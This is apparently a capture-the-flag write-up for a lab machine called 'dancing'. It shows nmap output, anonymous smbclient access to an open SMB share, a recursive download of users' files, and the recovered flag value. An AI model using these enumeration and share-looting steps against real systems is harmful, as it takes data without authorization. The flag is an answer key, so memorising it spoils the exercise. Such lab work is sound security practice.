## dancing
## Very Easy

## Start (08/27/2023)

- Nmap
  ```bash
  nmap -sV -sC -oN dancing.htb dancing.htb


  Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-27 15:56 EDT
  Nmap scan report for dancing.htb (10.129.1.12)
  Host is up (0.24s latency).
  Not shown: 997 closed tcp ports (conn-refused)
  PORT    STATE SERVICE       VERSION
  135/tcp open  msrpc         Microsoft Windows RPC
  139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
  445/tcp open  microsoft-ds?
  Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

  Host script results:
  | smb2-time:
  |   date: 2023-08-27T23:56:45
  |_  start_date: N/A
  | smb2-security-mode:
  |   311:
  |_    Message signing enabled but not required
  |_clock-skew: 4h00m00s

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 51.24 seconds


  ```

- Using SMBClient I can clearly see that I have some shares:
  ```bash
  smbclient -L dancing.htb


  Password for [WORKGROUP\vagrant]:

          Sharename       Type      Comment
          ---------       ----      -------
          ADMIN$          Disk      Remote Admin
          C$              Disk      Default share
          IPC$            IPC       Remote IPC
          WorkShares      Disk
  Reconnecting with SMB1 for workgroup listing.
  do_connect: Connection to dancing.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
  Unable to connect with SMB1 -- no workgroup available

  ```

- **WorkShares** seems interesting
- I can login to this share with no password:
  ```bash
  > smbclient -U '%' \\\\dancing.htb\\WorkShares


  Try "help" to get a list of possible commands.
  smb: \> dir
    .                                   D        0  Mon Mar 29 04:22:01 2021
    ..                                  D        0  Mon Mar 29 04:22:01 2021
    Amy.J                               D        0  Mon Mar 29 05:08:24 2021
    James.P                             D        0  Thu Jun  3 04:38:03 2021

                  5114111 blocks of size 4096. 1750278 blocks available
  smb: \>
  ```
- Downloading everything
  ```bash

  smb: \> recurse ON
  smb: \> prompt OFF
  smb: \> mget *
  getting file \Amy.J\worknotes.txt of size 94 as Amy.J/worknotes.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
  getting file \James.P\flag.txt of size 32 as James.P/flag.txt (0.1 KiloBytes/sec) (average 0.2 KiloBytes/sec)

  ```

- The flag is included in the downloads
## ROOT: 5f61c10dffbc77a704d76016a22f1664
